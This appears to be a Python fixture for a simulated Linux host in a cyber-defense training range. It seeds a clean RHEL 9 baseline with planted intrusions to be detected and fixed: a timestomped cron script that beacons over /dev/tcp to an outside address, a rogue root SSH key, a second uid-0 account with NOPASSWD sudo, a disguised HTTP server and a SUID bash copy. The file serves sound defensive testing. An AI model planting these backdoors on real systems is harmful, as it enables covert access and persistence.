"""Seeded state for the simulated Linux host.

The simulated host (simhost.py) answers the adapter's collection commands from this dictionary and mutates
it when a vetted fix payload runs. The seed is a realistic clean RHEL 9 baseline with the twelve seeded
problems from range/answer_key/linux.json layered on top, so collect -> detect finds exactly the answer
key and apply/verify/rollback are real state transitions.
"""
from __future__ import annotations

import copy

HOSTNAME = "acd-target-01"

# A rogue ed25519 public key (static, so the fixture is reproducible). Not a key to any real host.
ROGUE_KEY_BLOB = "AAAAC3NzaC1lZDI1NTE5AAAAIB1cyberthunderSEEDEDroguekeyFORdemoONLYxxxxxxxxxxx"

CLEAN_PACKAGES = [
    ("openssh-server", "8.7p1", "38.el9"), ("openssh", "8.7p1", "38.el9"), ("openssh-clients", "8.7p1", "38.el9"),
    ("openssl", "3.2.2", "6.el9"), ("openssl-libs", "3.2.2", "6.el9"), ("glibc", "2.34", "100.el9"),
    ("glibc-common", "2.34", "100.el9"), ("sudo", "1.9.5p2", "10.el9"), ("bash", "5.1.8", "9.el9"),
    ("coreutils", "8.32", "35.el9"), ("systemd", "252", "32.el9"), ("polkit", "0.117", "13.el9"),
    ("python3", "3.9.18", "3.el9"), ("python3-libs", "3.9.18", "3.el9"), ("curl", "7.76.1", "31.el9"),
    ("libcurl", "7.76.1", "31.el9"), ("xz", "5.2.5", "8.el9"), ("xz-libs", "5.2.5", "8.el9"),
    ("rpm", "4.16.1.3", "29.el9"), ("dnf", "4.14.0", "17.el9"), ("audit", "3.1.2", "2.el9"),
    ("firewalld", "1.3.4", "1.el9"), ("selinux-policy", "38.1.35", "2.el9"), ("rsyslog", "8.2310", "3.el9"),
    ("chrony", "4.5", "1.el9"), ("crontabs", "1.11", "26.el9"), ("util-linux", "2.37.4", "20.el9"),
    ("shadow-utils", "4.9", "9.el9"), ("pam", "1.5.1", "20.el9"), ("kernel", "5.14.0", "427.el9"),
    ("kernel-core", "5.14.0", "427.el9"), ("ncurses", "6.2", "10.el9"), ("gnutls", "3.8.3", "4.el9"),
    ("krb5-libs", "1.21.1", "2.el9"), ("zlib", "1.2.11", "40.el9"), ("expat", "2.5.0", "2.el9"),
    ("libxml2", "2.9.13", "6.el9"), ("nss", "3.90.0", "7.el9"), ("vim-minimal", "8.2.2637", "20.el9"),
    ("less", "590", "4.el9"),
]

CLEAN_USERS = [
    # name, uid, gid, gecos, home, shell
    ("root", 0, 0, "root", "/root", "/bin/bash"),
    ("bin", 1, 1, "bin", "/bin", "/sbin/nologin"),
    ("daemon", 2, 2, "daemon", "/sbin", "/sbin/nologin"),
    ("sshd", 74, 74, "Privilege-separated SSH", "/usr/share/empty.sshd", "/sbin/nologin"),
    ("chrony", 994, 994, "", "/var/lib/chrony", "/sbin/nologin"),
    ("sailor", 1000, 1000, "Watch Stander", "/home/sailor", "/bin/bash"),
    ("itadmin", 1001, 1001, "IT Administrator", "/home/itadmin", "/bin/bash"),
]
KNOWN_USERS = ["root", "sailor", "itadmin"]

CLEAN_GROUPS = [
    ("root", 0, []), ("bin", 1, []), ("daemon", 2, []), ("wheel", 10, ["itadmin"]), ("sshd", 74, []),
    ("chrony", 994, []), ("sailor", 1000, []), ("itadmin", 1001, []),
]

# itadmin's legitimate key, on the known-key list in demo_targets options.
ADMIN_KEY_BLOB = "AAAAC3NzaC1lZDI1NTE5AAAAICitadminLEGITIMATEkeyFORsailorADMINaccessxxxxxxxx"

CLEAN_UNITS = [
    ("sshd.service", "enabled", "active"), ("firewalld.service", "enabled", "active"),
    ("auditd.service", "enabled", "active"), ("chronyd.service", "enabled", "active"),
    ("rsyslog.service", "enabled", "active"), ("crond.service", "enabled", "active"),
    ("ctrl-alt-del.target", "masked", "inactive"), ("NetworkManager.service", "enabled", "active"),
]

CLEAN_SSHD = {
    "permitrootlogin": "no", "permitemptypasswords": "no", "usepam": "yes", "x11forwarding": "no",
    "hostbasedauthentication": "no", "port": "22", "ciphers": "aes256-gcm@openssh.com,aes128-gcm@openssh.com",
    "macs": "hmac-sha2-512,hmac-sha2-256", "clientaliveinterval": "600", "clientalivecountmax": "1",
    "banner": "/etc/issue",
}

# SUID/SGID baseline the clean host ships (all on hunt.SUID_BASELINE).
CLEAN_SUID = [
    ("4755", "root", "/usr/bin/sudo"), ("4755", "root", "/usr/bin/su"), ("4755", "root", "/usr/bin/passwd"),
    ("4755", "root", "/usr/bin/chage"), ("4755", "root", "/usr/bin/mount"), ("4755", "root", "/usr/bin/umount"),
    ("4755", "root", "/usr/bin/pkexec"), ("4755", "root", "/usr/bin/crontab"), ("2755", "root", "/usr/bin/write"),
    ("4755", "root", "/usr/sbin/unix_chkpwd"),
]


def _shadow_entry(name: str, locked: bool = False) -> str:
    h = "!!" if locked else "$6$seed$1234567890abcdefSEEDEDhashNOTrealFORsimulationONLYxxxxxxxxxxxxxxxx."
    return h


def seed_state() -> dict:
    """A fresh copy of the seeded host state."""
    users = [{"name": n, "uid": u, "gid": g, "gecos": c, "home": h, "shell": s}
             for (n, u, g, c, h, s) in CLEAN_USERS]
    shadow = {u["name"]: _shadow_entry(u["name"], locked=u["shell"] in (
        "/sbin/nologin", "/usr/sbin/nologin")) for u in users}
    groups = [{"name": n, "gid": g, "members": list(m)} for (n, g, m) in CLEAN_GROUPS]
    packages = [{"name": n, "epoch": None, "version": v, "release": r, "arch": "x86_64"}
                for (n, v, r) in CLEAN_PACKAGES]
    units = {name: {"enabled": en, "active": ac} for (name, en, ac) in CLEAN_UNITS}
    files = {
        "/etc/ssh/sshd_config": {"mode": 0o600, "owner": "root", "group": "root",
                                 "content": "# managed by range seed\nInclude /etc/ssh/sshd_config.d/*.conf\n"},
        "/etc/shadow": {"mode": 0o644, "owner": "root", "group": "root", "content": ""},   # M3: mode 0644
        "/etc/passwd": {"mode": 0o644, "owner": "root", "group": "root", "content": ""},
        "/etc/group": {"mode": 0o644, "owner": "root", "group": "root", "content": ""},
        "/etc/gshadow": {"mode": 0o000, "owner": "root", "group": "root", "content": ""},
        "/etc/login.defs": {"mode": 0o644, "owner": "root", "group": "root",
                            "content": "PASS_MAX_DAYS 60\nPASS_MIN_DAYS 1\nUMASK 077\n"},
        "/etc/dnf/dnf.conf": {"mode": 0o644, "owner": "root", "group": "root",
                              "content": "[main]\ngpgcheck=1\ninstallonly_limit=3\n"},
        "/etc/sysctl.conf": {"mode": 0o644, "owner": "root", "group": "root",
                             "content": "kernel.randomize_va_space = 2\n"},
        "/etc/selinux/config": {"mode": 0o644, "owner": "root", "group": "root",
                                "content": "SELINUX=enforcing\nSELINUXTYPE=targeted\n"},
        "/etc/systemd/coredump.conf": {"mode": 0o644, "owner": "root", "group": "root",
                                       "content": "[Coredump]\nStorage=none\nProcessSizeMax=0\n"},
        "/etc/sudoers": {"mode": 0o440, "owner": "root", "group": "root",
                         "content": "root ALL=(ALL) ALL\n%wheel ALL=(ALL) ALL\n"},
        "/root/.ssh/authorized_keys": {"mode": 0o600, "owner": "root", "group": "root", "content": ""},
        "/home/itadmin/.ssh/authorized_keys": {"mode": 0o600, "owner": "itadmin", "group": "itadmin",
                                               "content": f"ssh-ed25519 {ADMIN_KEY_BLOB} itadmin@workstation\n"},
    }
    sysctl = {"kernel.randomize_va_space": "2"}
    suid = [{"mode": m, "owner": o, "path": p} for (m, o, p) in CLEAN_SUID]
    state = {
        "hostname": HOSTNAME,
        "os_release": ('NAME="Red Hat Enterprise Linux"\nVERSION="9.4 (Plow)"\nID="rhel"\nVERSION_ID="9.4"\n'
                       'PRETTY_NAME="Red Hat Enterprise Linux 9.4 (Plow)"\nPLATFORM_ID="platform:el9"\n'),
        "kernel": "5.14.0-427.el9.x86_64",
        "addrs": '1: lo    inet 127.0.0.1/8 scope host lo\n2: eth0    inet 10.0.20.11/24 scope global eth0\n',
        "selinux": "Enforcing",
        "users": users, "shadow": shadow, "groups": groups, "packages": packages, "units": units,
        "files": files, "sysctl": sysctl, "suid": suid,
        "removed_packages": [],
        "listeners": [], "procs": {},
        "auth_log": "", "lastb": "", "last": "sailor  pts/0  10.0.20.5  Mon Nov  3 08:14 still logged in\n",
        "quarantine": {},
    }
    _apply_seeded_intrusions(state)
    return state


def _apply_seeded_intrusions(s: dict) -> None:
    # M1 PermitRootLogin yes, M2 PermitEmptyPasswords yes.
    # Effective sshd config (sshd -T) is the base defaults overlaid with the directives in
    # /etc/ssh/sshd_config, so a fix that edits the file and a rollback that restores it both show up
    # in sshd -T, exactly as on a real host. The seed writes the two bad directives into the file.
    s["sshd_base"] = dict(CLEAN_SSHD, permitrootlogin="no", permitemptypasswords="no")
    s["files"]["/etc/ssh/sshd_config"]["content"] = (
        "PermitRootLogin yes\nPermitEmptyPasswords yes\n"
        "# managed by range seed\nInclude /etc/ssh/sshd_config.d/*.conf\n")
    # M4 firewalld disabled
    s["units"]["firewalld.service"] = {"enabled": "disabled", "active": "inactive"}
    # M5 ctrl-alt-del.target unmasked
    s["units"]["ctrl-alt-del.target"] = {"enabled": "disabled", "active": "inactive"}
    # M6 world-writable dir under /var/log
    s["ww_dirs"] = [{"mode": "0777", "owner": "root", "path": "/var/log/acd-seed-dir"}]

    # I1 second uid-0 account svc_backup
    s["users"].append({"name": "svc_backup", "uid": 0, "gid": 0, "gecos": "Backup Service",
                       "home": "/root", "shell": "/bin/bash"})
    s["shadow"]["svc_backup"] = _shadow_entry("svc_backup")
    s["groups"].append({"name": "svc_backup", "gid": 2000, "members": []})
    s["shadow"]["sailor"] = ""   # empty-password seed is layered on sailor so the empty_password hunt fires

    # I2 rogue root authorized key jenkins@build-02
    s["files"]["/root/.ssh/authorized_keys"]["content"] = f"ssh-ed25519 {ROGUE_KEY_BLOB} jenkins@build-02\n"

    # I3 cron persistence, timestomped
    s["files"]["/usr/local/lib/.cache/update.sh"] = {
        "mode": 0o755, "owner": "root", "group": "root", "mtime": 1705287720.0, "ctime": 1762000000.0,
        "content": "#!/bin/bash\nexec 3<>/dev/tcp/10.10.10.10/8443 && echo \"$(hostname) $(id -u)\" >&3\n"}
    s["files"]["/etc/cron.d/.sysupdate"] = {
        "mode": 0o644, "owner": "root", "group": "root", "mtime": 1705287720.0, "ctime": 1762000000.0,
        "content": "*/5 * * * * root /usr/local/lib/.cache/update.sh >/dev/null 2>&1\n"}

    # I4 kworkerd.service python http.server on 4444 (unit file lives in files so stat/read/write work)
    s["files"]["/etc/systemd/system/kworkerd.service"] = {
        "mode": 0o644, "owner": "root", "group": "root",
        "content": ("[Unit]\nDescription=Kernel worker daemon\nAfter=network.target\n[Service]\n"
                    "ExecStart=/usr/bin/python3 -m http.server 4444 --directory /usr/local/lib/.cache\n"
                    "Restart=always\n[Install]\nWantedBy=multi-user.target\n")}
    s["units"]["kworkerd.service"] = {"enabled": "enabled", "active": "active"}
    s["procs"][7001] = {"unit": "kworkerd.service", "args": "/usr/bin/python3 -m http.server 4444 --directory /usr/local/lib/.cache"}
    s["procs"][812] = {"unit": "sshd.service", "args": "sshd: /usr/sbin/sshd -D [listener]"}
    s["listeners"] = [
        {"proto": "tcp", "addr": "0.0.0.0", "port": 22, "process": "sshd", "pid": 812},
        {"proto": "tcp", "addr": "0.0.0.0", "port": 4444, "process": "python3", "pid": 7001},
    ]

    # I5 SUID copy of bash
    # the SUID bit on this file is what puts it in the find -perm /6000 output (see simhost._suid)
    s["files"]["/usr/local/lib/.cache/.b"] = {"mode": 0o4755, "owner": "root", "group": "root",
                                              "content": "\x7fELF cyberthunder-sim bash copy", "is_bash_copy": True}

    # I6 sudoers drop-in NOPASSWD for svc_backup
    s["files"]["/etc/sudoers.d/90-backup"] = {"mode": 0o440, "owner": "root", "group": "root",
                                              "content": "svc_backup ALL=(ALL) NOPASSWD: ALL\n"}

    # brute-force noise so the failed_login_burst hunt has something to find
    lines = [f"Nov  3 0{h}:11:0{h} {HOSTNAME} sshd[2{h}01]: Failed password for invalid user admin from 10.10.10.22 port 5{h}122 ssh2"
             for h in range(1, 9)] * 2
    s["auth_log"] = "\n".join(lines) + "\n"

    s["hidden_dir"] = "/usr/local/lib/.cache"


def deep_copy(state: dict) -> dict:
    return copy.deepcopy(state)
